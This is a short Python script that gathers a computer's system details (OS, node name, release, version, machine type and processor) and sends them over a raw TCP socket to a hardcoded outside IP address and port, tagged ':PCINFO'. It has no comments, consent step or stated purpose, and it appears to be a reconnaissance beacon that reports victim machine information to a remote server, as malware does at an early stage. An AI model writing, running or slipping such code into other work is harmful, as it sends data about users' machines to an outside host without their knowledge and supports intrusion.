import platform
import socket

#Server info
ip = '3.26.216.143'
port = 4570

#Computer info
system_info = platform.uname()
System = f"System: {system_info.system}"
NodeName = f"Node Name: {system_info.node}"
Release = f"Release: {system_info.release}"
Version = f"Version: {system_info.version}"
Machine = f"Machine: {system_info.machine}"
Processor = f"Processor: {system_info.processor}"

cow = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cow.connect((ip, port))
PCinfo = ":PCINFO\n" + "\n".join([System, NodeName, Release, Version, Machine, Processor])
cow.send(PCinfo.encode())
cow.close()